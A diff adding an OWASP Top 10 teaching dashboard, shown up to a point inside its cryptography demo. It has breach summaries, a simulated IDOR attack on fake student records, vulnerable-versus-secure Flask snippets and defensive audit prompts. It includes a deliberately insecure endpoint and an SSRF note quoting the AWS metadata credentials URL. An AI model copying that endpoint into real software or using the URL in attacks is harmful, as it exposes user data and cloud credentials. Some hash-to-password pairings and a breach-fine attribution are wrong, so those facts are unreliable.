@@ -1,0 +1,1113 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>OWASP Top 10 — Interactive Demo Dashboard</title>
+<script src="https://cdn.tailwindcss.com"></script>
+<style>
+:root {
+  --bg:#f8fafc;
+  --card:#ffffff;
+  --card-muted:#f1f5f9;
+  --border:#e2e8f0;
+  --track:#e2e8f0;
+}
+body { background:var(--bg); color:#0f172a; font-family:'Segoe UI',system-ui,sans-serif; color-scheme:light; }
+::-webkit-scrollbar{width:8px} ::-webkit-scrollbar-track{background:var(--border)} ::-webkit-scrollbar-thumb{background:#cbd5e1;border-radius:4px}
+
+.terminal{ background:var(--card-muted); border:1px solid var(--border); border-radius:8px; font-family:'Cascadia Code','Fira Code',monospace; font-size:.76rem; line-height:1.7; overflow-x:auto; color:#0f172a; }
+.term-hdr{ background:#e8eef3; border-bottom:1px solid var(--border); padding:7px 14px; display:flex; align-items:center; gap:7px; }
+.dot{ width:10px;height:10px;border-radius:50%; }
+
+/* nav */
+.nav-item{ cursor:pointer; border:1px solid var(--border); border-radius:10px; transition:all .18s; background:var(--card); }
+.nav-item:hover{ border-color:#94a3b8; background:#f8fafc; }
+.nav-item.active{ background:#f1f5f9; box-shadow:0 1px 2px rgba(15,23,42,.06); }
+
+/* tabs */
+.tab-btn{ padding:5px 16px; border-radius:6px; font-size:.78rem; cursor:pointer; transition:all .15s; color:#64748b; }
+.tab-btn.active{ background:#e2e8f0; color:#0f172a; font-weight:600; }
+.tab-btn:hover:not(.active){ color:#334155; }
+
+/* risk meter */
+.risk-bar{ height:6px; border-radius:3px; }
+
+/* code diff */
+.code-vuln  { background:#fef2f2; border:1px solid #fecaca; border-radius:8px; }
+.code-secure{ background:#ecfdf5; border:1px solid #a7f3d0; border-radius:8px; }
+.code-label-vuln  { color:#b91c1c; font-size:.7rem; font-weight:700; letter-spacing:.08em; }
+.code-label-secure{ color:#047857; font-size:.7rem; font-weight:700; letter-spacing:.08em; }
+.code-vuln pre { color:#991b1b; }
+.code-secure pre { color:#047857; }
+
+/* attack sim */
+.sim-input{ background:var(--card); border:1px solid var(--border); border-radius:7px; padding:8px 12px; color:#0f172a; font-family:monospace; font-size:.85rem; width:100%; outline:none; transition:border-color .15s; }
+.sim-input:focus{ border-color:#0ea5e9; box-shadow:0 0 0 2px rgba(14,165,233,.2); }
+.sim-btn{ padding:8px 22px; border-radius:7px; font-weight:600; font-size:.83rem; cursor:pointer; transition:all .15s; }
+
+/* severity */
+.sev-CRITICAL{ border-left:3px solid #ef4444; }
+.sev-HIGH    { border-left:3px solid #f97316; }
+.sev-MEDIUM  { border-left:3px solid #f59e0b; }
+.sev-LOW     { border-left:3px solid #3b82f6; }
+.badge-CRITICAL{ background:#fef2f2;color:#b91c1c;border:1px solid #fecaca; }
+.badge-HIGH    { background:#fff7ed;color:#c2410c;border:1px solid #fed7aa; }
+.badge-MEDIUM  { background:#fffbeb;color:#b45309;border:1px solid #fde68a; }
+.badge-LOW     { background:#eff6ff;color:#1d4ed8;border:1px solid #bfdbfe; }
+
+.fade-in{ animation:fadeIn .3s ease; }
+@keyframes fadeIn{ from{opacity:0;transform:translateY(5px)} to{opacity:1;transform:none} }
+.spin{ animation:spin .8s linear infinite;display:inline-block; }
+@keyframes spin{ to{transform:rotate(360deg)} }
+.pulse{ animation:pulse 2s infinite; }
+@keyframes pulse{ 0%,100%{opacity:1} 50%{opacity:.6} }
+
+/* breach card */
+.breach-card{ background:linear-gradient(135deg,#fef2f2,#ffffff); border:1px solid #fecaca; border-radius:12px; }
+
+/* copy btn */
+.copy-btn{ background:var(--card-muted); border:1px solid var(--border); color:#475569; padding:3px 11px; border-radius:5px; font-size:.7rem; cursor:pointer; transition:all .15s; }
+.copy-btn:hover{ background:#e2e8f0; color:#0f172a; }
+.copy-btn.ok{ color:#047857; border-color:#6ee7b7; background:#ecfdf5; }
+
+/* timeline dot */
+.tl-dot{ width:11px;height:11px;border-radius:50%;flex-shrink:0;margin-top:4px; }
+
+/* progress bar animate */
+.bar-fill{ transition:width 1s ease; }
+
+/* result box */
+.result-ok  { background:#ecfdf5;border:1px solid #6ee7b7; color:#0f172a; }
+.result-bad { background:#fef2f2; border:1px solid #fecaca; color:#0f172a; }
+.result-warn{ background:#fffbeb;border:1px solid #fde68a; color:#0f172a; }
+</style>
+</head>
+<body class="text-slate-800 min-h-screen">
+
+<!-- HEADER -->
+<header class="sticky top-0 z-50 border-b bg-white shadow-sm" style="border-color:var(--border);">
+  <div class="max-w-screen-2xl mx-auto px-5 py-3 flex items-center justify-between">
+    <div class="flex items-center gap-3">
+      <div class="text-2xl font-black" style="color:#e25822;">OWASP</div>
+      <div class="w-px h-8 bg-slate-200"></div>
+      <div>
+        <div class="text-sm font-bold text-slate-900">Top 10 Security Risks — 2021</div>
+        <div class="text-xs text-slate-500">Interactive Demo Dashboard · AI-Powered Learning</div>
+      </div>
+    </div>
+    <div class="flex items-center gap-3">
+      <span class="text-xs px-3 py-1 rounded-full pulse" style="background:#fff7ed;border:1px solid #fdba74;color:#c2410c;">● LIVE DEMO</span>
+      <span class="text-xs text-slate-500">10 Vulnerabilities · 4 Interactive Attacks</span>
+    </div>
+  </div>
+</header>
+
+<div class="max-w-screen-2xl mx-auto flex bg-slate-50" style="min-height:calc(100vh - 53px);">
+
+  <!-- SIDEBAR -->
+  <aside class="w-64 flex-shrink-0 p-3 space-y-1 border-r border-slate-200 bg-white overflow-y-auto" style="position:sticky;top:53px;height:calc(100vh - 53px);">
+    <p class="text-xs font-bold text-slate-500 uppercase tracking-widest px-2 mb-3 mt-1">Vulnerability Categories</p>
+    <div id="nav-items"></div>
+  </aside>
+
+  <!-- MAIN -->
+  <main class="flex-1 overflow-y-auto p-5 space-y-5" id="main-content">
+    <div id="demo-header" class="fade-in"></div>
+
+    <!-- breach card -->
+    <div id="breach-card" class="fade-in"></div>
+
+    <!-- controls -->
+    <div class="flex items-center justify-between fade-in" id="ctrl-bar">
+      <div id="tab-bar" class="flex gap-0.5 p-1 rounded-lg bg-white border border-slate-200"></div>
+      <button id="run-btn" onclick="runDemo()" class="sim-btn border border-slate-300 bg-slate-100 text-slate-800 hover:bg-slate-200">
+        ▶ Run Demo
+      </button>
+    </div>
+
+    <div id="tab-panels" class="fade-in space-y-4"></div>
+    <div id="prompts-panel" class="fade-in" style="display:none;"></div>
+  </main>
+</div>
+
+<script>
+// ════════════════════════════════════════════════════════════════════════════════
+// EMBEDDED DEMO DATA — All data hardcoded for GitHub Pages compatibility
+// ════════════════════════════════════════════════════════════════════════════════
+
+const OWASP = [
+    {"id":"a01","rank":"A01:2021","icon":"🔓","title":"Broken Access Control","short":"Users acting outside their intended permissions","color":"#ef4444","risk":9,"prevalence":"94%","cwe":["CWE-200","CWE-284","CWE-352"],"breach":{"company":"Facebook / Meta","year":2019,"impact":"533 million user records (phone numbers, emails, DOBs)","cost":"$5B FTC fine — largest privacy fine in history","how":"IDOR: attacker iterated user IDs in the contact importer API — no authorization check per request."}},
+    {"id":"a02","rank":"A02:2021","icon":"🔑","title":"Cryptographic Failures","short":"Sensitive data exposed due to weak or missing encryption","color":"#f97316","risk":8,"prevalence":"43%","cwe":["CWE-259","CWE-327","CWE-331"],"breach":{"company":"LinkedIn","year":2012,"impact":"6.5 million MD5 password hashes leaked — cracked within 24 hours","cost":"$1.25M class-action settlement, mass account takeovers","how":"Passwords stored as unsalted MD5. Rainbow tables cracked 90%+ in hours."}},
+    {"id":"a03","rank":"A03:2021","icon":"💉","title":"Injection","short":"Attacker-controlled data interpreted as commands","color":"#dc2626","risk":10,"prevalence":"19% (3rd most critical)","cwe":["CWE-89","CWE-79","CWE-78"],"breach":{"company":"Equifax","year":2017,"impact":"148 million Americans' SSNs, credit scores, addresses exposed","cost":"$700M+ settlement — largest data breach settlement ever","how":"Apache Struts OGNL injection (CVE-2017-5638). Patch available 2 months before breach."}},
+    {"id":"a04","rank":"A04:2021","icon":"📐","title":"Insecure Design","short":"Missing or flawed security controls at the architecture level","color":"#8b5cf6","risk":7,"prevalence":"New in 2021","cwe":["CWE-209","CWE-256","CWE-501"],"breach":{"company":"Instagram / Meta","year":2019,"impact":"Any account takeable via predictable 6-digit OTP","cost":"Account takeover of celebrities and journalists — no disclosed fine","how":"Password reset OTP was sequential & had no rate limit. 10⁶ combinations brutable in minutes."}},
+    {"id":"a05","rank":"A05:2021","icon":"⚙️","title":"Security Misconfiguration","short":"Default settings, exposed admin panels, verbose error messages","color":"#f59e0b","risk":8,"prevalence":"90% of apps have some misconfiguration","cwe":["CWE-16","CWE-611"],"breach":{"company":"Microsoft Power Apps","year":2021,"impact":"38 million records exposed (COVID vaccination status, SSNs, contact tracing data)","cost":"Reputational damage across 47 organizations including American Airlines","how":"Default table permissions in Power Apps portals were 'public'. No one changed them."}},
+    {"id":"a06","rank":"A06:2021","icon":"📦","title":"Vulnerable & Outdated Components","short":"Using libraries with known CVEs","color":"#10b981","risk":7,"prevalence":"Libraries avg. 4 years behind on updates","cwe":["CWE-1104"],"breach":{"company":"Equifax (again)","year":2017,"impact":"Same breach — Apache Struts 2.3.5 unpatched for 2 months post-CVE","cost":"$700M — 100% preventable with dependency updates","how":"CVE-2017-5638 patch released March 6. Equifax breached May 12. They just didn't update."}},
+    {"id":"a07","rank":"A07:2021","icon":"👤","title":"Auth & Identification Failures","short":"Weak passwords, credential stuffing, session issues","color":"#3b82f6","risk":8,"prevalence":"84% of apps have auth weaknesses","cwe":["CWE-297","CWE-384","CWE-521"],"breach":{"company":"Zoom","year":2020,"impact":"500,000 Zoom credentials sold on dark web for $0.002 each","cost":"Mass account takeover during peak COVID remote-work usage","how":"Credential stuffing: attackers used leaked passwords from OTHER breaches. No MFA, no rate limit."}},
+    {"id":"a08","rank":"A08:2021","icon":"🔗","title":"Software & Data Integrity Failures","short":"Untrusted updates, CI/CD pipeline attacks, insecure deserialization","color":"#6366f1","risk":7,"prevalence":"New in 2021","cwe":["CWE-502","CWE-345","CWE-494"],"breach":{"company":"SolarWinds","year":2020,"impact":"18,000 organizations including US Treasury, Pentagon, Microsoft","cost":"$40M+ direct costs; classified national security damage","how":"Attackers injected SUNBURST backdoor into SolarWinds Orion build pipeline. Signed by SolarWinds' own cert."}},
+    {"id":"a09","rank":"A09:2021","icon":"📋","title":"Logging & Monitoring Failures","short":"Breaches undetected for months due to blind spots","color":"#14b8a6","risk":6,"prevalence":"Majority of breaches undetected for 200+ days","cwe":["CWE-117","CWE-223","CWE-532"],"breach":{"company":"Equifax (trilogy)","year":2017,"impact":"Breach active 78 days before detection","cost":"If detected in day 1 vs day 78: estimated $10M vs $700M response cost","how":"TLS inspection was disabled for 19 months — attacker traffic looked like normal HTTPS."}},
+    {"id":"a10","rank":"A10:2021","icon":"🌐","title":"Server-Side Request Forgery","short":"Server fetches attacker-controlled URLs, exposing internal services","color":"#ec4899","risk":8,"prevalence":"New in 2021 — cloud era attack","cwe":["CWE-918"],"breach":{"company":"Capital One","year":2019,"impact":"106 million customers' financial records: SSNs, bank accounts, credit scores","cost":"$190M settlement","how":"Misconfigured WAF + SSRF: attacker used GET request to hit AWS metadata endpoint http://169.254.169.254/latest/meta-data/iam/security-credentials/"}}
+];
+
+const FAKE_USERS = {
+    "1001":{"id":1001,"name":"Arjun Sharma","email":"arjun@college.edu","role":"student","gpa":8.4,"phone":"+91-9876543001","balance":12500,"dob":"2002-03-14"},
+    "1002":{"id":1002,"name":"Priya Nair","email":"priya@college.edu","role":"student","gpa":9.1,"phone":"+91-9876543002","balance":8200,"dob":"2001-11-22"},
+    "1003":{"id":1003,"name":"Rahul Gupta","email":"rahul@college.edu","role":"student","gpa":7.6,"phone":"+91-9876543003","balance":15000,"dob":"2003-05-30"},
+    "1004":{"id":1004,"name":"Admin Account","email":"admin@college.edu","role":"ADMIN","gpa":null,"phone":"+91-9876540000","balance":null,"dob":null}
+};
+
+let currentId = 'a01', currentData = null;
+
+document.addEventListener('DOMContentLoaded', () => {
+  renderSidebar();
+  selectItem('a01');
+});
+
+// ── SIDEBAR ────────────────────────────────────────────────────────────────────
+function renderSidebar() {
+  const html = OWASP.map((item, idx) => `
+    <div class="nav-item p-2.5 ${idx===0?'active':''}" onclick="selectItem('${item.id}')" id="nav-${item.id}"
+         style="${idx===0?'border-color:'+item.color+'44;':''}">
+      <div class="flex items-center gap-2.5">
+        <span class="text-base">${item.icon}</span>
+        <div class="min-w-0 flex-1">
+          <div class="text-xs font-bold truncate" style="color:${item.color}">${item.rank}</div>
+          <div class="text-xs text-slate-700 truncate leading-tight">${item.title}</div>
+        </div>
+        <div class="flex-shrink-0 text-xs font-black" style="color:${item.color}">${item.risk}</div>
+      </div>
+      <div class="mt-1.5 w-full h-1 rounded-full bg-slate-200">
+        <div class="h-1 rounded-full bar-fill" style="width:${item.risk*10}%;background:${item.color};opacity:.7;"></div>
+      </div>
+    </div>`).join('');
+  document.getElementById('nav-items').innerHTML = html;
+}
+
+// ── SELECT ────────────────────────────────────────────────────────────────────
+function selectItem(id) {
+  currentId = id; currentData = null;
+  const meta = OWASP.find(o => o.id === id);
+  document.querySelectorAll('.nav-item').forEach(el => {
+    el.classList.remove('active');
+    el.style.borderColor = '';
+  });
+  const nav = document.getElementById('nav-' + id);
+  nav?.classList.add('active');
+  nav && (nav.style.borderColor = meta.color + '55');
+  renderHeader(meta);
+  renderBreach(meta);
+  document.getElementById('tab-bar').innerHTML = '';
+  document.getElementById('tab-panels').innerHTML = '';
+  document.getElementById('prompts-panel').style.display = 'none';
+  document.getElementById('run-btn').innerHTML = '▶ Run Demo';
+  document.getElementById('run-btn').disabled = false;
+  document.getElementById('run-btn').style.borderColor = meta.color + '55';
+  document.getElementById('run-btn').style.color = meta.color;
+}
+
+// ── HEADER ────────────────────────────────────────────────────────────────────
+function renderHeader(m) {
+  const riskColor = m.risk >= 9 ? '#ef4444' : m.risk >= 7 ? '#f97316' : '#f59e0b';
+  document.getElementById('demo-header').innerHTML = `
+    <div class="rounded-xl p-5" style="background:var(--card);border:1px solid ${m.color}33;">
+      <div class="flex items-start justify-between gap-4">
+        <div class="flex items-center gap-4">
+          <span class="text-4xl">${m.icon}</span>
+          <div>
+            <div class="flex items-center gap-2 mb-1">
+              <span class="text-sm font-black" style="color:${m.color}">${m.rank}</span>
+              <h2 class="text-xl font-bold text-slate-900">${m.title}</h2>
+            </div>
+            <p class="text-slate-400 text-sm">${m.short}</p>
+            <div class="flex gap-2 mt-2 flex-wrap">
+              ${m.cwe.map(c => `<span class="text-xs px-2 py-0.5 rounded" style="background:#f1f5f9;border:1px solid var(--border);color:#64748b;">${c}</span>`).join('')}
+              <span class="text-xs px-2 py-0.5 rounded" style="background:#f8fafc;border:1px solid var(--border);color:#64748b;">Prevalence: ${m.prevalence}</span>
+            </div>
+          </div>
+        </div>
+        <div class="text-right flex-shrink-0">
+          <div class="text-4xl font-black" style="color:${riskColor}">${m.risk}<span class="text-lg text-slate-600">/10</span></div>
+          <div class="text-xs text-slate-500 mt-0.5">Risk Score</div>
+          <div class="mt-2 w-28 h-2 rounded-full" style="background:var(--track);">
+            <div class="h-2 rounded-full" style="width:${m.risk*10}%;background:linear-gradient(90deg,${riskColor}88,${riskColor});"></div>
+          </div>
+        </div>
+      </div>
+    </div>`;
+}
+
+// ── BREACH CARD ───────────────────────────────────────────────────────────────
+function renderBreach(m) {
+  const b = m.breach;
+  document.getElementById('breach-card').innerHTML = `
+    <div class="breach-card p-4">
+      <div class="flex items-start gap-4">
+        <div class="text-2xl">💥</div>
+        <div class="flex-1 min-w-0">
+          <div class="flex items-center gap-2 mb-1 flex-wrap">
+            <span class="text-xs font-bold text-red-400 uppercase tracking-wide">Real-World Breach</span>
+            <span class="font-bold text-slate-900">${esc(b.company)}</span>
+            <span class="text-slate-500 text-xs">${b.year}</span>
+          </div>
+          <p class="text-sm text-slate-700 mb-1">${esc(b.impact)}</p>
+          <p class="text-sm font-semibold text-red-400 mb-2">${esc(b.cost)}</p>
+          <p class="text-xs text-slate-500"><span class="text-slate-400 font-semibold">How: </span>${esc(b.how)}</p>
+        </div>
+      </div>
+    </div>`;
+}
+
+// ── RUN DEMO ──────────────────────────────────────────────────────────────────
+function runDemo() {
+  const btn = document.getElementById('run-btn');
+  btn.disabled = true; btn.innerHTML = '<span class="spin">⚙</span> Loading…';
+  try {
+    const demoRunners = {a01:runA01,a02:runA02,a03:runA03,a04:runA04,a05:runA05,a06:runA06,a07:runA07,a08:runA08,a09:runA09,a10:runA10};
+    currentData = demoRunners[currentId]?.();
+    if (!currentData) throw new Error('Demo not found');
+    const renderers = {a01:renderA01,a02:renderA02,a03:renderA03,a04:renderA04,a05:renderA05,a06:renderA06,a07:renderA07,a08:renderA08,a09:renderA09,a10:renderA10};
+    renderers[currentId]?.(currentData);
+    renderPrompts(currentData.prompts);
+  } catch(e) { document.getElementById('tab-panels').innerHTML = `<div class="p-4 text-red-400 text-sm">${esc(e.message)}</div>`; }
+  finally { btn.disabled=false; btn.innerHTML='↺ Run Again'; }
+}
+
+// ── TABS ──────────────────────────────────────────────────────────────────────
+function buildTabs(labels) {
+  document.getElementById('tab-bar').innerHTML = labels.map((l,i) =>
+    `<button class="tab-btn ${i===0?'active':''}" onclick="switchTab(${i})">${l}</button>`).join('');
+}
+function switchTab(i) {
+  document.querySelectorAll('.tab-btn').forEach((b,j) => b.classList.toggle('active',i===j));
+  document.querySelectorAll('.tab-panel').forEach((p,j) => p.style.display=i===j?'block':'none');
+}
+function setPanels(panels) {
+  document.getElementById('tab-panels').innerHTML = panels.map((h,i) =>
+    `<div class="tab-panel fade-in" style="display:${i===0?'block':'none'}">${h}</div>`).join('');
+}
+
+// ── PROMPTS ───────────────────────────────────────────────────────────────────
+function renderPrompts(prompts) {
+  if (!prompts?.length) return;
+  const html = `
+    <div class="rounded-xl p-5" style="background:var(--card);border:1px solid var(--border);">
+      <div class="flex items-center gap-2 mb-4">
+        <span class="text-lg">🤖</span>
+        <h3 class="font-bold text-slate-800">Claude Code Prompts</h3>
+        <span class="text-xs text-slate-600">— paste into your terminal</span>
+      </div>
+      <div class="space-y-3">
+        ${prompts.map((p,i) => `
+          <div class="rounded-lg p-4" style="background:var(--card-muted);border:1px solid var(--border);">
+            <div class="flex justify-between items-start gap-2 mb-2">
+              <span class="text-xs font-semibold text-slate-400">Prompt ${i+1}: ${esc(p.label)}</span>
+              <button class="copy-btn" id="cp${i}" onclick="copy(${i},'${esc(p.text.replace(/'/g,"__SQ__"))}')">Copy</button>
+            </div>
+            <pre class="text-xs text-slate-700 whitespace-pre-wrap leading-relaxed">${esc(p.text)}</pre>
+          </div>`).join('')}
+      </div>
+    </div>`;
+  const panel = document.getElementById('prompts-panel');
+  panel.innerHTML = html; panel.style.display = 'block';
+}
+async function copy(i, raw) {
+  const text = raw.replace(/__SQ__/g,"'");
+  await navigator.clipboard.writeText(text).catch(()=>{});
+  const btn = document.getElementById('cp' + i);
+  btn.textContent = '✓'; btn.classList.add('ok');
+  setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('ok'); }, 2000);
+}
+
+// ── HELPERS ───────────────────────────────────────────────────────────────────
+function esc(s) { return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'); }
+function badge(s) { return `<span class="text-xs px-2 py-0.5 rounded font-bold badge-${s}">${s}</span>`; }
+function termWrap(title, body) {
+  return `<div class="terminal"><div class="term-hdr">
+    <div class="dot" style="background:#ff5f56"></div><div class="dot" style="background:#ffbd2e"></div><div class="dot" style="background:#27c93f"></div>
+    <span class="text-xs text-slate-600 ml-2">${esc(title)}</span></div><div class="p-4">${body}</div></div>`;
+}
+function codeDiff(title_v, code_v, title_s, code_s) {
+  return `<div class="grid grid-cols-2 gap-3">
+    <div class="code-vuln p-4 rounded-lg">
+      <div class="code-label-vuln mb-2">✗ VULNERABLE — ${esc(title_v)}</div>
+      <pre class="text-xs text-red-900 whitespace-pre-wrap leading-relaxed">${esc(code_v)}</pre></div>
+    <div class="code-secure p-4 rounded-lg">
+      <div class="code-label-secure mb-2">✓ SECURE — ${esc(title_s)}</div>
+      <pre class="text-xs text-emerald-900 whitespace-pre-wrap leading-relaxed">${esc(code_s)}</pre></div>
+  </div>`;
+}
+function card(content, style='') {
+  return `<div class="rounded-xl p-4" style="background:var(--card);border:1px solid var(--border);${style}">${content}</div>`;
+}
+
+// ════════════════════════════════════════════════════════════════════════════════
+// DEMO RUNNERS — Embedded demo data and simulators
+// ════════════════════════════════════════════════════════════════════════════════
+
+function runA01() {
+  const timeline = [
+    {"step":1,"action":"Log in as student (ID 1001)","result":"Session token issued","safe":true},
+    {"step":2,"action":"GET /api/profile/1001  (own data)","result":"✓ Returns own profile","safe":true},
+    {"step":3,"action":"GET /api/profile/1002  (another student!)","result":"✓ Returns Priya's GPA, phone, balance!","safe":false},
+    {"step":4,"action":"GET /api/profile/1004  (admin account!)","result":"✓ Returns ADMIN account details","safe":false},
+  ];
+  const vuln_code=`# VULNERABLE — no authorization check
+@app.get("/api/profile/<user_id>")
+def get_profile(user_id):
+    return db.query(
+        "SELECT * FROM users WHERE id = ?", user_id
+    )  # ← returns ANY user if you know the ID`;
+  const secure_code=`# SECURE — verify caller owns the resource
+@app.get("/api/profile/<user_id>")
+@require_auth
+def get_profile(user_id, current_user):
+    if str(current_user.id) != str(user_id):
+        abort(403)        # ← explicitly deny cross-user access
+    return db.query(
+        "SELECT * FROM users WHERE id = ?", user_id
+    )`;
+  const prompts=[
+    {"label":"Find All IDOR Patterns","text":"Review this Flask REST API codebase for Insecure Direct Object Reference (IDOR) vulnerabilities. For every endpoint that takes a resource ID in the URL or body, check if there is an authorization check that verifies the requesting user owns or has permission to access that resource. List all vulnerable endpoints with the exact fix."},
+    {"label":"Write Authorization Middleware","text":"Write a Python decorator @require_ownership(resource_type) for Flask that: (1) extracts the resource ID from the URL, (2) looks up the resource owner in the DB, (3) compares to the logged-in user, (4) returns 403 if mismatch. Make it reusable across all endpoints."},
+    {"label":"Generate IDOR Test Cases","text":"Write pytest integration tests for Broken Access Control. Test these scenarios: (1) user A cannot access user B's profile, (2) student cannot access admin endpoints, (3) user cannot modify another user's data, (4) horizontal privilege escalation via parameter tampering."},
+  ];
+
+  const steps=timeline.map(t=>`
+    <div class="flex gap-3 items-start pb-4">
+      <div class="tl-dot mt-1 flex-shrink-0" style="background:${t.safe?'#10b981':'#ef4444'};box-shadow:0 0 6px ${t.safe?'#10b98188':'#ef444488'};"></div>
+      <div><span class="text-xs font-mono text-slate-500 mr-2">Step ${t.step}</span>
+        <span class="text-xs ${t.safe?'text-emerald-400':'text-red-400'} font-semibold">${t.safe?'✓':'✗'}</span>
+        <p class="text-sm text-slate-800 mt-0.5">${esc(t.action)}</p>
+        <p class="text-xs ${t.safe?'text-emerald-400':'text-red-400'} mt-0.5">${esc(t.result)}</p>
+      </div>
+    </div>`).join('');
+
+  const users=Object.values(FAKE_USERS).map(u=>`
+    <tr class="border-b" style="border-color:var(--border);">
+      <td class="py-2 pr-3 font-mono text-xs text-cyan-400">${u.id}</td>
+      <td class="py-2 pr-3 text-sm text-slate-800">${esc(u.name)}</td>
+      <td class="py-2 pr-3 text-xs text-slate-400">${esc(u.email)}</td>
+      <td class="py-2 pr-3 text-xs ${u.role==='ADMIN'?'text-red-400 font-bold':'text-slate-500'}">${esc(u.role)}</td>
+      <td class="py-2 text-xs text-slate-400">${u.phone}</td>
+    </tr>`).join('');
+
+  const sim=`
+    <div class="space-y-4">
+      <div class="p-4 rounded-lg" style="background:var(--card-muted);border:1px solid var(--border);">
+        <p class="text-sm text-slate-700 mb-3">You are logged in as <span class="text-cyan-400 font-mono">Student #1001</span>. Try changing the ID to access other accounts.</p>
+        <div class="flex gap-3 items-center">
+          <span class="text-xs text-slate-500 font-mono">GET /api/profile/</span>
+          <input id="idor-input" class="sim-input" style="width:100px;" value="1001" placeholder="user_id"/>
+          <button onclick="runIdor()" class="sim-btn" style="background:rgba(239,68,68,.1);border:1px solid rgba(239,68,68,.3);color:#fca5a5;">Send Request</button>
+        </div>
+        <p class="text-xs text-slate-600 mt-2">Try: 1001 (own) · 1002 · 1003 · 1004 (admin)</p>
+      </div>
+      <div id="idor-result" class="rounded-lg p-4 text-sm text-slate-500 italic" style="background:var(--card-muted);border:1px solid var(--border);">← Result appears here</div>
+    </div>`;
+
+  setPanels([
+    card(`<h3 class="text-sm font-semibold text-slate-700 mb-4">IDOR Attack — Step by Step</h3>${steps}`),
+    card(`<h3 class="text-sm font-semibold text-slate-700 mb-3">All User Records (exposed via IDOR)</h3><table class="w-full"><tbody>${users}</tbody></table>`),
+    codeDiff('no authorization check',vuln_code,'ownership verified',secure_code),
+    sim,
+  ]);
+  return {prompts};
+}
+
+async function runIdor() {
+  const id=document.getElementById('idor-input').value.trim();
+  const user=FAKE_USERS[id];
+  const box=document.getElementById('idor-result');
+  if (!user) { box.className='rounded-lg p-4 result-warn'; box.innerHTML=`<span class="text-amber-400">User not found. Try: 1001, 1002, 1003, 1004</span>`; return; }
+  const is_own=id==='1001';
+  const color=is_own?'result-ok':'result-bad';
+  box.className=`rounded-lg p-4 ${color}`;
+  box.innerHTML=`
+    <div class="font-mono text-xs text-slate-500 mb-2">Query: <span class="text-amber-300">SELECT * FROM users WHERE id = ${id}</span></div>
+    ${!is_own?`<div class="text-red-400 font-bold text-sm mb-2">⚠ You accessed ${user.name}'s data without permission!</div>`:''}
+    ${user.role==='ADMIN'?`<div class="text-red-400 font-bold text-sm mb-2">🚨 ADMIN ACCOUNT EXPOSED!</div>`:''}
+    <div class="text-xs space-y-1 font-mono">
+      ${Object.entries(user).map(([k,v])=>v!==null?`<div><span class="text-slate-500">${esc(k)}:</span> <span class="text-slate-800">${esc(String(v))}</span></div>`:'').join('')}
+    </div>`;
+}
+
+function runA02() {
+  const PASSWORD_DB=[
+    {user:"alice",hash_md5:"5f4dcc3b5aa765d61d8327deb882cf99",plain:"password123",strength:"weak"},
+    {user:"bob",hash_md5:"202cb962ac59075b964b07152d234b70",plain:"123456",strength:"very weak"},
+    {user:"carol",hash_md5:"c0e41e8cc465c3d7fc58d7e85a41d13d",plain:"linkedin",strength:"weak"},
+    {user:"dave",hash_md5:"f2477375b53d9e129c65146e60b3e582",plain:"trustno1",strength:"weak"},
+    {user:"eve",hash_md5:"7e242ec8e308e6ba2aaf1e57fbc2750c",plain:"iloveyou",strength:"weak"},
+    {user:"frank",hash_md5:"3ea96a3d6c99a5c37c14cbbae7d74c3c",plain:"Xk$9#mP2@vL!qR7",strength:"strong"},
+  ];
+  const crack_times=[
+    {algorithm:"MD5 (unsalted)",color:"#ef4444",time:"< 1 second",cracked:true,note:"Rainbow table lookup"},
+    {algorithm:"SHA-1 (unsalted)",color:"#f97316",time:"< 1 second",cracked:true,note:"Rainbow table lookup"},
+    {algorithm:"SHA-256 (unsalted)",color:"#f59e0b",time:"Minutes",cracked:true,note:"GPU brute force on common words"},
+    {algorithm:"bcrypt (cost=10)",color:"#10b981",time:"Years",cracked:false,note:"~100ms per attempt — brute force infeasible"},
+    {algorithm:"Argon2id (m=64MB)",color:"#10b981",time:"Centuries",cracked:false,note:"Memory-hard — GPU acceleration useless"},
+  ];
+  const data_exposure=[
+    {type:"Credit card numbers",in_transit:false,at_rest:false,severity:"CRITICAL",regulation:"PCI DSS"},
+    {type:"Passwords",in_transit:true,at_rest:false,severity:"CRITICAL",regulation:"GDPR"},
+    {type:"Health records",in_transit:true,at_rest:false,severity:"HIGH",regulation:"HIPAA"},
+    {type:"Email addresses",in_transit:true,at_rest:true,severity:"MEDIUM",regulation:"GDPR"},
+    {type:"Session tokens",in_transit:true,at_rest:false,severity:"HIGH",regulation:"OWASP"},
+    {type:"API keys in source",in_transit:null,at_rest:false,severity:"CRITICAL",regulation:"All"},
+  ];
+  const prompts=[
+    {label:"Audit Crypto Usage",text:"Scan this codebase for cryptographic failures. Look for: (1) MD5/SHA1 used for passwords, (2) hardcoded secrets or API keys, (3) HTTP instead of HTTPS, (4) weak cipher suites like DES/RC4, (5) missing TLS certificate validation. Report each finding with file:line and the secure alternative."},
+    {label:"Password Storage Migration",text:"I have a legacy database with 50,000 unsalted MD5 password hashes. Write a migration plan to move to bcrypt: (1) how to re-hash on next login without forcing password resets, (2) the Flask-Bcrypt implementation, (3) how to detect and flag accounts with cracked MD5 hashes."},
+    {label:"Find Secrets in Code",text:"Write a Python script that scans a git repository for leaked secrets: API keys, passwords, private keys, connection strings. Use regex patterns for common secret formats (AWS keys, Stripe keys, JWT secrets, DB passwords in .env files). Output file:line:secret_type."},
+  ];
+
+  const rows=PASSWORD_DB.map(p=>`
+    <tr class="border-b" style="border-color:var(--border);">
+      <td class="py-2 pr-3 font-mono text-xs text-slate-700">${esc(p.user)}</td>
+      <td class="py-2 pr-3 font-mono text-xs text-amber-300">${esc(p.hash_md5)}</td>
+      <td class="py-2 pr-3 text-xs ${p.strength==='strong'?'text-emerald-400':'text-red-400'}">${esc(p.plain)}</td>
+      <td class="py-2 text-xs ${p.strength==='strong'?'text-emerald-400':'text-red-400'}">${esc(p.strength)}</td>
+    </tr>`).join('');
+
+  const crackBars=crack_times.map(c=>`
+    <div class="flex items-center gap-3 py-2 border-b" style="border-color:var(--border);">
+      <div class="w-40 text-xs text-slate-700 flex-shrink-0">${esc(c.algorithm)}</div>
+      <div class="flex-1 h-3 rounded-full" style="background:var(--track);">
+        <div class="h-3 rounded-full" style="width:${c.cracked?'100%':'8%'};background:${c.color};opacity:.7;"></div>
+      </div>
